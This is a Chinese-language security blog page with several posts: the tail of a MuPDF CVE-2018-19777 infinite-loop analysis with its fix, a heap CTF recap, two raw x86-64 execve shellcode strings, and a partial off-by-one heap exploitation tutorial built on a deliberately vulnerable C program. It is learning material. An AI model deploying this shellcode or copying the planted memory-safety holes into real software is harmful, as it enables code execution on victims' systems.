<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">runrange</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *range)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> start, end, i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((range = fz_parse_page_range(ctx, range, &amp;start, &amp;end, count)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (start &lt; end)</span><br><span class="line">			<span class="keyword">for</span> (i = start; i &lt;= end; ++i)</span><br><span class="line">				runpage(i);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">for</span> (i = start; i &gt;= end; --i)</span><br><span class="line">				runpage(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">runpage</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fz_rect mediabox;</span><br><span class="line">	fz_page *page;</span><br><span class="line">	fz_device *dev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	page = fz_load_page(ctx, doc, number - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	fz_var(dev);</span><br><span class="line"></span><br><span class="line">	fz_try(ctx)</span><br><span class="line">	&#123;</span><br><span class="line">		mediabox = fz_bound_page(ctx, page);</span><br><span class="line">		dev = fz_begin_page(ctx, out, mediabox);</span><br><span class="line">		fz_run_page(ctx, page, dev, fz_identity, <span class="literal">NULL</span>);<span class="comment">//svg_dev_end_tile的调用函数</span></span><br><span class="line">	&#125;</span><br><span class="line">	fz_always(ctx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (dev)</span><br><span class="line">			fz_end_page(ctx, out);</span><br><span class="line">		fz_drop_page(ctx, page);</span><br><span class="line">	&#125;</span><br><span class="line">	fz_catch(ctx)</span><br><span class="line">		fz_rethrow(ctx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fz_device *</span><br><span class="line">fz_begin_page(fz_context *ctx, fz_document_writer *wri, fz_rect mediabox)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!wri)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	wri-&gt;dev = wri-&gt;begin_page(ctx, wri, mediabox);</span><br><span class="line">	<span class="keyword">return</span> wri-&gt;dev;<span class="comment">//返回的wri-&gt;dev指针即包含了svg_dev_end_tile 在内的一套函数指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fz_run_page(fz_context *ctx, fz_page *page, fz_device *dev, fz_matrix transform, fz_cookie *cookie)</span><br><span class="line">&#123;</span><br><span class="line">	fz_annot *annot;</span><br><span class="line"></span><br><span class="line">	fz_run_page_contents(ctx, page, dev, transform, cookie);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">fz_run_page_contents(fz_context *ctx, fz_page *page, fz_device *dev, fz_matrix transform, fz_cookie *cookie)</span><br><span class="line">&#123;</span><br><span class="line">	if (page &amp;&amp; page-&gt;run_page_contents &amp;&amp; page)</span><br><span class="line">	&#123;</span><br><span class="line">		fz_try(ctx)</span><br><span class="line">		&#123;</span><br><span class="line">			page-&gt;run_page_contents(ctx, page, dev, transform, cookie);</span><br><span class="line">		&#125;</span><br><span class="line">		fz_catch(ctx)</span><br><span class="line">		&#123;</span><br><span class="line">			if (fz_caught(ctx) != FZ_ERROR_ABORT)</span><br><span class="line">				fz_rethrow(ctx);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再往下的分析没有继续，因为我并没有找到<strong>page-&gt;run_page_contents</strong>的初始定义</p>
<p>但是猜测应该是与这两处地方的代码有关</p>
<p>其一为pdf-page.c中的解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">page-&gt;super.run_page_contents = (fz_page_run_page_fn*)pdf_run_page_contents;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pdf_run_page_contents_with_usage(ctx, doc, page, dev, ctm, &quot;View&quot;, cookie);//此函数即为pdf格式解析部分</span><br></pre></td></tr></table></figure>
<p>另一处为svg-doc.c中的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page-&gt;super.run_page_contents = svg_run_page;</span><br></pre></td></tr></table></figure>
<p>但是这里的代码应该是加载svg文件时进行分析的，不太像是</p>
<h5 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h5><p>因为影响这个循环的是 t-&gt;step.x、t-&gt;step.y</p>
<p>这时，进行判断 t-&gt;step.x == 0 可能是起作用的，</p>
<p>最新版本中的修复并没有在函数<strong>svg_dev_end_tile</strong>内，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">w = t-&gt;view.x1 - t-&gt;view.x0;</span><br><span class="line">	h = t-&gt;view.y1 - t-&gt;view.y0;</span><br><span class="line"></span><br><span class="line">	for (x = 0; x &gt; -w; x -= t-&gt;step.x)</span><br><span class="line">		for (y = 0; y &gt; -h; y -= t-&gt;step.y)</span><br><span class="line">			fz_write_printf(ctx, out, &quot;&lt;use x=\&quot;%g\&quot; y=\&quot;%g\&quot; xlink:href=\&quot;#pac%d\&quot;/&gt;\n&quot;, x, y, t-&gt;pattern);</span><br></pre></td></tr></table></figure>
<p>而是在<strong>svg_dev_begin_tile</strong>内加入了判断代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">svg_dev_begin_tile(fz_context *ctx, fz_device *dev, fz_rect area, fz_rect view, float xstep, float ystep, fz_matrix ctm, int id)</span><br><span class="line">&#123;</span><br><span class="line">	svg_device *sdev = (svg_device*)dev;</span><br><span class="line">	fz_output *out;</span><br><span class="line">	int num;</span><br><span class="line">	tile *t;</span><br><span class="line"></span><br><span class="line">	if (sdev-&gt;num_tiles == sdev-&gt;max_tiles)</span><br><span class="line">	&#123;</span><br><span class="line">		int n = (sdev-&gt;num_tiles == 0 ? 4 : sdev-&gt;num_tiles * 2);</span><br><span class="line"></span><br><span class="line">		sdev-&gt;tiles = fz_realloc_array(ctx, sdev-&gt;tiles, n, tile);</span><br><span class="line">		sdev-&gt;max_tiles = n;</span><br><span class="line">	&#125;</span><br><span class="line">	num = sdev-&gt;num_tiles++;</span><br><span class="line">	t = &amp;sdev-&gt;tiles[num];</span><br><span class="line">	t-&gt;area = area;</span><br><span class="line">	t-&gt;view = view;</span><br><span class="line">	t-&gt;ctm = ctm;</span><br><span class="line">	t-&gt;pattern = sdev-&gt;id++;</span><br><span class="line"></span><br><span class="line">	xstep = fabsf(xstep);</span><br><span class="line">	ystep = fabsf(ystep);</span><br><span class="line">	if (xstep == 0 || ystep == 0) &#123;</span><br><span class="line">		fz_warn(ctx, &quot;Pattern cannot have x or ystep == 0.&quot;);</span><br><span class="line">		if (xstep == 0)</span><br><span class="line">			xstep = 1;</span><br><span class="line">		if (ystep == 0)</span><br><span class="line">			ystep = 1;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><p><a href="https://www.cvedetails.com/cve/CVE-2018-19777/" target="_blank" rel="noopener">cve漏洞报告</a></p>
<p><a href="https://bugs.ghostscript.com/show_bug.cgi?id=700301" target="_blank" rel="noopener">cve漏洞详细报告以及poc所在地址</a></p>
<p><a href="https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf" target="_blank" rel="noopener">PDF1.7协议</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/09/10/chunk块的伪造2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/10/chunk块的伪造2/" itemprop="url">chunk块的伪造2</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-10T15:04:22+08:00">
                2019-09-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  18
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>gg</p>
<p>没保存</p>
<p>懒得再写了，不准备再复现一遍了</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/29/Ogeek-hub/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/29/Ogeek-hub/" itemprop="url">Ogeek_hub</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-29T15:16:01+08:00">
                2019-08-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  236
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>错误是要被记住的，这次实在是太蠢了，我得吸取教训。</p>
<p>我被卡住的原因是，这个程序可以进行写入的部分只能写入8字节。我被这个地方卡住了。</p>
<p>我实在是太傻了，忘记了可以重复多次写入，因为相对位置是固定的只需要爆破一次就够了。</p>
<p>另外就是没注意到。。。。我可以用bss段储存的stdout指针。</p>
<p>我哭了，真的，我实在是tcl。</p>
<p>我居然绕了个远路，用house of storm（实际上，如果可以写入十字节数据，这是可行的），但是现在不行，因为只能写入8字节，无法进行unsortedbin攻击，会在malloc_hook中写入libc数据那里卡住。gg</p>
<p>我真的是。。。为了可以控制改写libc中的数据，我用的unsortedbin unlink。</p>
<p>可是程序中居然有stdout</p>
<p>gggggggggg</p>
<p>leak完就可以进行改写malloc_hook为onegadet，完事。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/22/无限制条件的shellcode整理/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/22/无限制条件的shellcode整理/" itemprop="url">无限制条件的shellcode整理</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-22T16:37:27+08:00">
                2019-08-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  69
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>程序中有execve()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>
<p>无execve()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>
<p>后面需要跟libc基地址</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/21/off-by-one-or-off-by-null/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/21/off-by-one-or-off-by-null/" itemprop="url">off_by_one or off_by_null</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-21T21:59:01+08:00">
                2019-08-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  666
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  3
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这个类型的利用属于比基础利用稍微高一点的，不难，这次准备重新复习一遍是因为我上次做题居然连这个漏洞都没看出来。。。。。</p>
<p>最近刷的题目都是uaf的，我真是太菜了，当时真没看出来，gg</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>我写了一个简短的利用代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> choose;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1,add note\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2,delete note\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3,show note\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"4,rename note\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choose);</span><br><span class="line">	<span class="keyword">return</span> choose;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *ptr[<span class="number">11</span>])</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index,lengh;</span><br><span class="line">	<span class="keyword">char</span> wow[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">char</span> dest[<span class="number">6</span>] = <span class="string">"%"</span>;</span><br><span class="line">	<span class="keyword">for</span>(index = <span class="number">0</span>;index&gt;=<span class="number">0</span>&amp;&amp;index&lt;=<span class="number">11</span>&amp;&amp;ptr[index];index++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(index==<span class="number">11</span>)&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"The list is full"</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,index);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Lengh:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;lengh);</span><br><span class="line">	ptr[index] = <span class="built_in">malloc</span>(lengh);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"content\n"</span>);	</span><br><span class="line">	<span class="built_in">sprintf</span>(&amp;wow,<span class="string">"%ds"</span>,lengh);</span><br><span class="line">	<span class="built_in">strcat</span>(dest,wow);</span><br><span class="line">	<span class="built_in">scanf</span>(&amp;dest,ptr[index]);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">char</span> *ptr[<span class="number">11</span>])</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Your index\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s"</span>,ptr[index]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deletenote</span><span class="params">(<span class="keyword">char</span> *ptr[<span class="number">11</span>])</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Your index\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line">	<span class="built_in">free</span>(ptr[index]);</span><br><span class="line">	ptr[index] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* ptr[<span class="number">11</span>]; <span class="comment">//= malloc(0x30);</span></span><br><span class="line">	<span class="keyword">int</span> choose;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		choose = print_list();</span><br><span class="line">		<span class="keyword">switch</span>(choose)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				add(ptr);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				deletenote(ptr);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				show(ptr);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span>;			</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"Invalid choose"</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序有add，delete,show的功能，原本是有rename功能的，但是我没有实现，实际上，我准备把这个例子实现后看在没有show功能的情况下能否实现利用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">'whitegive'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'whitegive'</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/21/off-by-one-or-off-by-null/1.PNG" alt="1"></p>
<p>下个chunk块的prev_size已经被我们改变，也就是说我们可以成功的使用这个漏洞，那么，如何利用这个漏洞获得bin/sh权限呢</p>
<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>我直接</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>但是报错，因为我没有构造上一个chunk的size</p>
<p>改动如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">'whitegive'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'whitegive'</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#add(0xf8,'whitegive')#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>gg,仍然失败，无法进行delete(1)</p>
<p>调试malloc.c</p>
<p>得到如下反馈:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a8cf4f &lt;_int_free+511&gt;     mov    rax, qword ptr [rbx + 0x10]</span><br><span class="line">0x7ffff7a8cf53 &lt;_int_free+515&gt;     mov    rdx, qword ptr [rbx + 0x18]</span><br><span class="line">0x7ffff7a8cf57 &lt;_int_free+519&gt;     cmp    rbx, qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
